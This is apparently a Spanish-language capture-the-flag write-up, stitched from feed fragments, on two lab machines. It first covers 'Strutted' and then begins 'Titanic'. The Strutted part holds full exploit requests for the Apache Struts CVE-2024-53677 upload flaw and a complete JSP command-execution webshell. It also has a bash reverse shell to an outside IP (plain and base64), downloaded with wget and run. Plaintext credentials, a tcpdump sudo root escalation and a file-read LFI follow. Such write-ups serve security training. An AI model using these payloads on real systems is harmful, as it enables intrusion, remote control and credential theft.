 1 warning found (use docker --debug to expand):
 - FromPlatformFlagConstDisallowed: FROM --platform flag should not use constant value "linux/amd64" (line 1)
<br><br> zip cat tomcat-users.xml 
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: tomcat-users.xml
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ &lt;?xml version='1.0' encoding='utf-8'?&gt;
   2   │ 
   3   │ &lt;tomcat-users&gt;
   4   │     &lt;role rolename="manager-gui"/&gt;
   5   │     &lt;role rolename="admin-gui"/&gt;
   6   │     &lt;user username="admin" password="skqKY6360z!Y" roles="manager-gui,admin-gui"/&gt;
   7   │ &lt;/tomcat-users&gt;

<br>Iniciamos el container<br>sudo docker run strutted:latest -p 127.0.0.1:8080:8080
<br>abrimos el puerto 8080 porque nos levanta ahi el servidor web<br>
<img alt="Pasted image 20250218193053.png" src="machines/strutted/imgs/pasted-image-20250218193053.png"><br>
ahora si que funciona el boton de share<br>
<img alt="Pasted image 20250218193125.png" src="machines/strutted/imgs/pasted-image-20250218193125.png"><br>
la url es la siguiente:<br>http://localhost:8080/upload.action;jsessionid=77B072C79D33493E1F925B50D9C382DD
<br>Observo que la url nos lleva al archivo subido en el servidor y coge el nombre de nuestra cookie jsessionid;<br>
<img alt="Pasted image 20250218193246.png" src="machines/strutted/imgs/pasted-image-20250218193246.png"><br>La url del boton copy es la siguiente<br>http://localhost:8080/s/0eee89ed
<br>pruebo a subirle otra imagen y me devuelve la siguiente url<br>http://localhost:8080/s/1eb4f0d5
<br>Deduzco que le genera un nombre aleatorio a cada archivo subido por lo que encontrar el que subimos en el servidor real se nos complica;<br>Encuentro el path donde se suben las imagenes dentro del container;<br>root@7c452e833a19:/usr/local/tomcat/webapps/ROOT/uploads# tree .
.
├── 20250218_183101
│   └── john.png
├── 20250218_183424
│   └── john.png
└── 20250218_183515
    └── 2024-11-19_18-50.png

<br><br>Ya que es un tomcat y por tanto un proyecto java buscamos donde esta el pom.xml<br>root@7c452e833a19:/usr/local/tomcat# find / -type f -name pom.xml 
/usr/local/tomcat/webapps/ROOT/META-INF/maven/org.strutted.htb/strutted/pom.xml
<br>POM.xml:<br>&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;
&lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt;
    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;

    &lt;packaging&gt;war&lt;/packaging&gt;

    &lt;artifactId&gt;strutted&lt;/artifactId&gt;
    &lt;groupId&gt;org.strutted.htb&lt;/groupId&gt;
    &lt;version&gt;1.0.0&lt;/version&gt;

    &lt;name&gt;Strutted™&lt;/name&gt;
    &lt;description&gt;Instantly upload an image and receive a unique, shareable link. Keep your images secure, accessible, and easy to share—anywhere, anytime.&lt;/description&gt;

    &lt;properties&gt;
        &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;
        &lt;maven.compiler.source&gt;17&lt;/maven.compiler.source&gt;
        &lt;maven.compiler.target&gt;17&lt;/maven.compiler.target&gt;
        &lt;struts2.version&gt;6.3.0.1&lt;/struts2.version&gt;
        &lt;jetty-plugin.version&gt;9.4.46.v20220331&lt;/jetty-plugin.version&gt;
        &lt;maven.javadoc.skip&gt;true&lt;/maven.javadoc.skip&gt;
        &lt;jackson.version&gt;2.14.1&lt;/jackson.version&gt;
        &lt;jackson-data-bind.version&gt;2.14.1&lt;/jackson-data-bind.version&gt;
    &lt;/properties&gt;

    &lt;dependencyManagement&gt;
        &lt;dependencies&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;javax.servlet&lt;/groupId&gt;
                &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt;
                &lt;version&gt;4.0.1&lt;/version&gt;
                &lt;scope&gt;compile&lt;/scope&gt;
            &lt;/dependency&gt;

            &lt;dependency&gt;
                &lt;groupId&gt;org.apache.struts&lt;/groupId&gt;
                &lt;artifactId&gt;struts2-core&lt;/artifactId&gt;
                &lt;version&gt;${struts2.version}&lt;/version&gt;
            &lt;/dependency&gt;

            &lt;dependency&gt;
                &lt;groupId&gt;org.apache.struts&lt;/groupId&gt;
                &lt;artifactId&gt;struts2-config-browser-plugin&lt;/artifactId&gt;
                &lt;version&gt;${struts2.version}&lt;/version&gt;
            &lt;/dependency&gt;

            &lt;dependency&gt;
                &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;
                &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;
                &lt;version&gt;${jackson-data-bind.version}&lt;/version&gt;
            &lt;/dependency&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;com.fasterxml.jackson.dataformat&lt;/groupId&gt;
                &lt;artifactId&gt;jackson-dataformat-xml&lt;/artifactId&gt;
                &lt;version&gt;${jackson.version}&lt;/version&gt;
            &lt;/dependency&gt;


        &lt;/dependencies&gt;
    &lt;/dependencyManagement&gt;

    &lt;dependencies&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.apache.struts&lt;/groupId&gt;
            &lt;artifactId&gt;struts2-core&lt;/artifactId&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;javax.servlet&lt;/groupId&gt;
            &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
          &lt;groupId&gt;org.xerial&lt;/groupId&gt;
          &lt;artifactId&gt;sqlite-jdbc&lt;/artifactId&gt;
          &lt;version&gt;3.47.1.0&lt;/version&gt;
        &lt;/dependency&gt;
    &lt;/dependencies&gt;

    &lt;build&gt;
        &lt;plugins&gt;
            &lt;plugin&gt;
                &lt;groupId&gt;org.eclipse.jetty&lt;/groupId&gt;
                &lt;artifactId&gt;jetty-maven-plugin&lt;/artifactId&gt;
                &lt;version&gt;${jetty-plugin.version}&lt;/version&gt;
                &lt;configuration&gt;
                    &lt;webApp&gt;
                        &lt;contextPath&gt;/${project.artifactId}&lt;/contextPath&gt;
                    &lt;/webApp&gt;
                    &lt;stopKey&gt;CTRL+C&lt;/stopKey&gt;
                    &lt;stopPort&gt;8999&lt;/stopPort&gt;
                    &lt;httpConnector&gt;
                        &lt;port&gt;9999&lt;/port&gt;
                    &lt;/httpConnector&gt;
                    &lt;scanIntervalSeconds&gt;10&lt;/scanIntervalSeconds&gt;
                &lt;/configuration&gt;
            &lt;/plugin&gt;
        &lt;/plugins&gt;

        &lt;pluginManagement&gt;
            &lt;plugins&gt;
                &lt;plugin&gt;
                    &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;
                    &lt;artifactId&gt;maven-war-plugin&lt;/artifactId&gt;
                    &lt;version&gt;3.4.0&lt;/version&gt;
                &lt;/plugin&gt;
            &lt;/plugins&gt;
        &lt;/pluginManagement&gt;

    &lt;/build&gt;
&lt;/project&gt;

<br>observamos que esta usando el MVC framework apache struts<br>
En el struts2.version vemos la version:<br>&lt;struts2.version&gt;6.3.0.1&lt;/struts2.version&gt;
<br>Investigando encontramos un par de vulnerabilidades;<br>
<a rel="noopener nofollow" class="external-link" href="https://security.snyk.io/package/maven/org.apache.struts%3Astruts2-core/6.3.0.1" target="_blank">https://security.snyk.io/package/maven/org.apache.struts%3Astruts2-core/6.3.0.1</a><br><br>CVE-2024-53677 : File upload logic in Apache Struts is flawed. An attacker can manipulate file upload params to enable paths traversal and under some circumstances this can lead to uploading a malicious file which can be used to perform Remote Code Execution. This issue affects Apache Struts: from 2.0.0 before 6.4.0. Users are recommended to upgrade to version 6.4.0 at least and migrate to the new file upload mechanism <a rel="noopener nofollow" class="external-link" href="https://struts.apache.org/core-developers/file-upload" target="_blank">https://struts.apache.org/core-developers/file-upload</a> . If you are not using an old file upload logic based on FileuploadInterceptor your application is safe. You can find more details in <a rel="noopener nofollow" class="external-link" href="https://cwiki.apache.org/confluence/display/WW/S2-067" target="_blank">https://cwiki.apache.org/confluence/display/WW/S2-067</a>.<br>Encuentro este articulo que explica la vulneravilidad donde el upload puede llevar a RCE<br>
<a rel="noopener nofollow" class="external-link" href="https://blogs.hiteshpatra.in/cve-2024-53677-apache-struts-file-upload-vulnerability-leading-to-rce" target="_blank">https://blogs.hiteshpatra.in/cve-2024-53677-apache-struts-file-upload-vulnerability-leading-to-rce</a><br>Para explotar esta vulnerabilidad como dice el informe probaremos un file traversal en el lado de subir la imagen para ver si nuestro archivo se sube donde no debiera, vamos a capturar la solicitud con burp y ver el resultado en nuestro docker . <br>en el repeater intento simplificar el texto de la subida de imagen lo maximo posible. pruebo con algun parametro pero la pagina bloquea cualquier cosa que no sea una imagen<br>
<img alt="Pasted image 20250219190254.png" src="machines/strutted/imgs/pasted-image-20250219190254.png"><br>Se suben las imagenes pero el contenido debe de ser de imagen<br>
<img alt="Pasted image 20250219190345.png" src="machines/strutted/imgs/pasted-image-20250219190345.png"><br>Para explotar el cve meto otro parametro a la solicitud de subida de archivos :<br>Mirando el Poc se le anade lo siguiente a la solicitud de burp<br>  # Attempt to overwrite file name using OGNL binding
    files = {
        "upload": ("test.txt", harmless_content, "text/plain"),
        "top.uploadFileName": test_filename  # Attempt filename overwrite
    }

    # Custom Content-Type boundary
    boundary = "----WebKitFormBoundary" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=16))
    m = MultipartEncoder(fields=files, boundary=boundary)
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": m.content_type
    }
<br>La petición queda tal que asi :<br>POST /upload.action;jsessionid=12027ECD4EDE843F44D6C8932AB3E1BE HTTP/1.1
Host: localhost:8080
Content-Length: 324
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="131", "Not_A Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Accept-Language: es-ES,es;q=0.9
Origin: http://localhost:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJHdpaH6gDs4Syohg
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost:8080/
Accept-Encoding: gzip, deflate, br
Cookie: JSESSIONID=12027ECD4EDE843F44D6C8932AB3E1BE
Connection: keep-alive

------WebKitFormBoundaryJHdpaH6gDs4Syohg
Content-Disposition: form-data; name="upload"; filename="whoa3mi.jpeg"
Content-Type: image/png

PNG

whoami

------WebKitFormBoundaryJHdpaH6gDs4Syohg
Content-Disposition: form-data; name="top.UploadFileName"

../test.txt

------WebKitFormBoundaryJHdpaH6gDs4Syohg--
<br>Sigue sin subirse el test.txt en el directorio anterior a uplodas; su cambiamos el "upload" miniscula a una U mayuscula; esto se debe a como la aplicacion del tomcat esta configurada; el Upload no se pasa al OGNL interceptor y la subida funciona<br>FUNCIONA!!<br>
<img alt="Pasted image 20250219191858.png" src="machines/strutted/imgs/pasted-image-20250219191858.png"><br>Dentro del archivo de texto esta el contenido del PNG<br><img alt="Pasted image 20250219193309.png" src="machines/strutted/imgs/pasted-image-20250219193309.png"><br>Nuestro objetivo a continuacion es subir un archivo .jsp que pueda interpretar javascript<br><br>Cogemos una <a data-tooltip-position="top" aria-label="https://raw.githubusercontent.com/tennc/webshell/refs/heads/master/fuzzdb-webshell/jsp/cmd.jsp" rel="noopener nofollow" class="external-link" href="https://raw.githubusercontent.com/tennc/webshell/refs/heads/master/fuzzdb-webshell/jsp/cmd.jsp" target="_blank">webshell</a> y lo pegamos despues del "PNG" en el request<br>
el request queda asi:<br>POST /upload.action;jsessionid=12027ECD4EDE843F44D6C8932AB3E1BE HTTP/1.1
Host: localhost:8080
Content-Length: 347
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="131", "Not_A Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Accept-Language: es-ES,es;q=0.9
Origin: http://localhost:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJHdpaH6gDs4Syohg
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost:8080/
Accept-Encoding: gzip, deflate, br
Cookie: JSESSIONID=12027ECD4EDE843F44D6C8932AB3E1BE
Connection: keep-alive

------WebKitFormBoundaryJHdpaH6gDs4Syohg
Content-Disposition: form-data; name="Upload"; filename="whoa3mi.jpeg"
Content-Type: image/png

PNG

&lt;%@ page import="java.util.*,java.io.*"%&gt;
&lt;%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: 27/06/2003
//
%&gt;
&lt;HTML&gt;&lt;BODY&gt;
&lt;FORM METHOD="GET" NAME="myform" ACTION=""&gt;
&lt;INPUT TYPE="text" NAME="cmd"&gt;
&lt;INPUT TYPE="submit" VALUE="Send"&gt;
&lt;/FORM&gt;
&lt;pre&gt;
&lt;%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "&lt;BR&gt;");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%&gt;
&lt;/pre&gt;
&lt;/BODY&gt;&lt;/HTML&gt;

------WebKitFormBoundaryJHdpaH6gDs4Syohg
Content-Disposition: form-data; name="top.UploadFileName"

../test2.jsp
------WebKitFormBoundaryJHdpaH6gDs4Syohg--


<br><img alt="Pasted image 20250219193832.png" src="machines/strutted/imgs/pasted-image-20250219193832.png"><br>
Se sube bien pero el navegador lo interpreta como texto plano esto tambien es por como tomcat esta configurado lo que se explica en POSTEXPLOITATION ; pruebo de nuevo pero llendo dos carpetas para atras ../../test.jsp<br><img alt="Pasted image 20250219194256.png" src="machines/strutted/imgs/pasted-image-20250219194256.png"><br>Bueno ahora funciona; vamos a probar el exploit en el servidor strutted;<br>El request queda asi:<br>POST /upload.action;jsessionid=743AE59EABCED3FCE5A904038A938DF3 HTTP/1.1
Host: strutted.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------4067362124160935221168699314
Content-Length: 52216
Origin: http://strutted.htb
Connection: keep-alive
Referer: http://strutted.htb/
Cookie: JSESSIONID=743AE59EABCED3FCE5A904038A938DF3
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------4067362124160935221168699314
Content-Disposition: form-data; name="Upload"; filename="john.png"
Content-Type: image/png

PNG

&lt;%@ page import="java.util.*,java.io.*"%&gt;
&lt;%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: 27/06/2003
//
%&gt;
&lt;HTML&gt;&lt;BODY&gt;
&lt;FORM METHOD="GET" NAME="myform" ACTION=""&gt;
&lt;INPUT TYPE="text" NAME="cmd"&gt;
&lt;INPUT TYPE="submit" VALUE="Send"&gt;
&lt;/FORM&gt;
&lt;pre&gt;
&lt;%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "&lt;BR&gt;");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%&gt;
&lt;/pre&gt;
&lt;/BODY&gt;&lt;/HTML&gt;

-----------------------------4067362124160935221168699314
Content-Disposition: form-data; name="top.UploadFileName"

../../test2.jsp

-----------------------------4067362124160935221168699314--
<br><img alt="Pasted image 20250219194843.png" src="machines/strutted/imgs/pasted-image-20250219194843.png"><br><img alt="Pasted image 20250219200651.png" src="machines/strutted/imgs/pasted-image-20250219200651.png"><br>Nos pasamos la rev-shell<br>Intente algunas <a data-tooltip-position="top" aria-label="https://www.youtube.com/watch?v=OjkVep2EIlw" rel="noopener nofollow" class="external-link" href="https://www.youtube.com/watch?v=OjkVep2EIlw" target="_blank">reverse shells </a> en la webshell, pero ninguna prompea la revshell. No me sorprende, ya que Java es especialmente complicada con los pipes y redirecciones en este tipo de inyecciones.<br>Probaré una versión codificada en base64."<br>Esta es una descripción de alguien probando diferentes métodos para obtener acceso a un sistema a través de una shell inversa, donde se enfrenta a dificultades debido a las restricciones del entorno (en este caso, Java).<br>~ echo 'bash -i &gt;&amp; /dev/tcp/10.10.14.187/2323 0&gt;&amp;1 ' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xODcvMjMyMyAwPiYxIAo=

<br>En la web-shell<br>echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xODcvMjMyMyAwPiYxIAo= | base64 -d | bash
<br>Pero las pipes | se ponen junto con el echo<br>
<img alt="Pasted image 20250219201859.png" src="machines/strutted/imgs/pasted-image-20250219201859.png"><br>
Pruebo a subir un script de bash<br>#!/bin/sh

bash -i &gt;&amp; /dev/tcp/10.10.14.187/2323 0&gt;&amp;1 
<br>Lo descargo desde la webshell con wget:<br>Command: wget http://10.10.14.187:2223/shell.sh -O /tmp/shell.sh
<br><img alt="Pasted image 20250219202933.png" src="machines/strutted/imgs/pasted-image-20250219202933.png"><br>Lo ejecuto:<br><img alt="Pasted image 20250219203006.png" src="machines/strutted/imgs/pasted-image-20250219203006.png"><br>continuamos en  <a data-tooltip-position="top" aria-label="Machines/Strutted/2.PrivESC" data-href="Machines/Strutted/2.PrivESC" href="machines/strutted/2.privesc.html" class="internal-link" target="_self" rel="noopener nofollow">2.PrivESC</a>]]></description><link>machines/strutted/1.recon.html</link><guid isPermaLink="false">Machines/Strutted/1.Recon.md</guid><pubDate>Mon, 24 Feb 2025 15:48:44 GMT</pubDate><enclosure url="machines/strutted/imgs/pasted-image-20250218190201.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;machines/strutted/imgs/pasted-image-20250218190201.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[User Tomcat]]></title><description><![CDATA[ 
 <br><br>cat /etc/passwd | grep -E "bash|sh"
root:x:0:0:root:/root:/bin/bash
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
james:x:1000:1000:Network Administrator:/home/james:/bin/bash
<br>Miramos en :/var/lib/tomcat9<br>tomcat@strutted:~/conf$ pwd
pwd
/var/lib/tomcat9/conf
tomcat@strutted:~/conf$ ls
ls
Catalina
catalina.properties
context.xml
jaspic-providers.xml
logging.properties
policy.d
server.xml
tomcat-users.xml
web.xml
tomcat@strutted:~/conf$ 

<br>Miramos el tomcat-users.xml que en el docker contenia informacion del usuario<br>tomcat@strutted:~/conf$ cat tomcat-*
cat tomcat-*
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
--&gt;
&lt;tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0"&gt;
&lt;!--
  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary.

  Built-in Tomcat manager roles:
    - manager-gui    - allows access to the HTML GUI and the status pages
    - manager-script - allows access to the HTTP API and the status pages
    - manager-jmx    - allows access to the JMX proxy and the status pages
    - manager-status - allows access to the status pages only

  The users below are wrapped in a comment and are therefore ignored. If you
  wish to configure one or more of these users for use with the manager web
  application, do not forget to remove the &lt;!.. ..&gt; that surrounds them. You
  will also need to set the passwords to something appropriate.
--&gt;
&lt;!--
  &lt;user username="admin" password="&lt;must-be-changed&gt;" roles="manager-gui"/&gt;
  &lt;user username="robot" password="&lt;must-be-changed&gt;" roles="manager-script"/&gt;
  &lt;role rolename="manager-gui"/&gt;
  &lt;role rolename="admin-gui"/&gt;
  &lt;user username="admin" password="IT14d6SSP81k" roles="manager-gui,admin-gui"/&gt;
---&gt;
&lt;!--
  The sample user and role entries below are intended for use with the
  examples web application. They are wrapped in a comment and thus are ignored
  when reading this file. If you wish to configure these users for use with the
  examples web application, do not forget to remove the &lt;!.. ..&gt; that surrounds
  them. You will also need to set the passwords to something appropriate.
--&gt;
&lt;!--
  &lt;role rolename="tomcat"/&gt;
  &lt;role rolename="role1"/&gt;
  &lt;user username="tomcat" password="&lt;must-be-changed&gt;" roles="tomcat"/&gt;
  &lt;user username="both" password="&lt;must-be-changed&gt;" roles="tomcat,role1"/&gt;
  &lt;user username="role1" password="&lt;must-be-changed&gt;" roles="role1"/&gt;
--&gt;
&lt;/tomcat-users&gt;

<br><br>Nos sale una contrasena; probamos ssh con James<br>
<img alt="Pasted image 20250219203634.png" src="machines/strutted/imgs/pasted-image-20250219203634.png"><br><br>Podemos usar sudo con el usuario james en tcpdump:<br>james@strutted:~$ sudo -l
Matching Defaults entries for james on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User james may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/sbin/tcpdump
james@strutted:~$ 

<br><br>Miramos en <a data-tooltip-position="top" aria-label="https://gtfobins.github.io/gtfobins/tcpdump/" rel="noopener nofollow" class="external-link" href="https://gtfobins.github.io/gtfobins/tcpdump/" target="_blank">GTFObins</a><br>
<img alt="Pasted image 20250219203905.png" src="machines/strutted/imgs/pasted-image-20250219203905.png"><br>Root!<br>
<img alt="Pasted image 20250219203857.png" src="machines/strutted/imgs/pasted-image-20250219203857.png"><br><br>sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root: <br>
<br>-l: Habilita la salida en vivo (muestra los paquetes a medida que se capturan).
<br>-n: No resuelve direcciones de red a nombres, solo muestra direcciones IP numéricas.
<br>-i lo: Escucha en la interfaz de loopback (lo), que es la interfaz de red interna del sistema.
<br>-w /dev/null: No guarda los paquetes capturados en un archivo, sino que los descarta (/dev/null).
<br>-W 1: Limita a una única captura de archivo, ya que el siguiente argumento de -G establece un intervalo de tiempo.
<br>-G 1: Cambia el archivo de captura cada 1 segundo (aunque no se guardan archivos porque se usa /dev/null).
<br>-z $TF: Ejecuta el archivo $TF después de cada archivo de captura. Este es el punto clave. El archivo temporal $TF es ejecutado, y dado que contiene el comando cat /root/root.txt, este comando se ejecutará después de cada captura.
<br>-Z root: Cambia el usuario que ejecuta tcpdump a root, lo que otorga privilegios elevados a tcpdump y al script $TF 
]]></description><link>machines/strutted/2.privesc.html</link><guid isPermaLink="false">Machines/Strutted/2.PrivESC.md</guid><pubDate>Mon, 24 Feb 2025 15:47:47 GMT</pubDate><enclosure url="machines/strutted/imgs/pasted-image-20250219203634.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;machines/strutted/imgs/pasted-image-20250219203634.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[1.Recon]]></title><description><![CDATA[ 
 <br><br><br>Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 70.18 seconds
           Raw packets sent: 70069 (3.083MB) | Rcvd: 65972 (2.639MB)

<br><br>PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGZG4yHYcDPrtn7U0l+ertBhGBgjIeH9vWnZcmqH0cvmCNvdcDY/ItR3tdB4yMJp0ZTth5itUVtlJJGHRYAZ8Wg=
|   256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDT1btWpkcbHWpNEEqICTtbAcQQitzOiPOmc3ZE0A69Z
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
|_http-favicon: Unknown favicon MD5: 79E1E0A79A613646F473CFEDA9E231F1
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Titanic - Book Your Ship Trip
| http-server-header: 
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/3.0.3 Python/3.10.12
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

<br><br><br>➜  ~ feroxbuster --url http://titanic.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -t 200
                                                                                                                     
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://titanic.htb
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
405      GET        5l       20w      153c http://titanic.htb/book
200      GET       30l       77w      567c http://titanic.htb/static/styles.css
200      GET     2986l     7000w   469100c http://titanic.htb/static/assets/images/favicon.ico
200      GET      664l     5682w   412611c http://titanic.htb/static/assets/images/home.jpg
200      GET      859l     5115w   510909c http://titanic.htb/static/assets/images/luxury-cabins.jpg
200      GET      890l     5324w   534018c http://titanic.htb/static/assets/images/entertainment.jpg
200      GET      851l     5313w   507854c http://titanic.htb/static/assets/images/exquisite-dining.jpg
200      GET      156l      415w     7399c http://titanic.htb/

<br>Un whatweb nos indica que estamos trabajando contra un Servidor web Python, Wekzeug;<br>➜  ~ whatweb http://titanic.htb 
http://titanic.htb [200 OK] Bootstrap[4.5.2], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.0.3 Python/3.10.12], IP[10.10.11.55], JQuery, Python[3.10.12], Script, Title[Titanic - Book Your Ship Trip], Werkzeug[3.0.3]
<br>Parece una pagina tipo "booking" para entradas al Titanic, esta cachonda;<br><img alt="Pasted image 20250217165949.png" src="machines/titanic/imgs/pasted-image-20250217165949.png"><br>
Ninguno de los botones de la pagina funcionan excepto el de Book Now;<br>
<img alt="Pasted image 20250217170046.png" src="machines/titanic/imgs/pasted-image-20250217170046.png"><br>Si le damos a submit nos decarga el formulario en formato json;<br>
El nombre del archivo es el siguiente 4852d90d-7587-420d-91e7-b4f84f2c539c.json parece que se genera un archivo de nombre aleatorio con el contenido rellenado del formulario;<br> {"name": "cher0", "email": "none@mail.com", "phone": "12345678", "date": "0002-02-02", "cabin": "Standard"}
<br>capturamos la peticion que enviamos al servidor cuando clickeamos submit<br>
<img alt="Pasted image 20250217170358.png" src="machines/titanic/imgs/pasted-image-20250217170358.png"><br>Nos redirige a la url http://titanic.htb/download?ticket=65449497-ae16-43b2-99f3-09656003ff09.json<br><br>Probamos a cambiar el nombre del archivo y nos da un not found; pero podemos leer archivos del sistema poniendo una ruta; realmente arcaico típico de la época del titanic.<br>
<img alt="Pasted image 20250217170935.png" src="machines/titanic/imgs/pasted-image-20250217170935.png"><br>
LFI:<br>http://titanic.htb/download?ticket=/etc/passwd
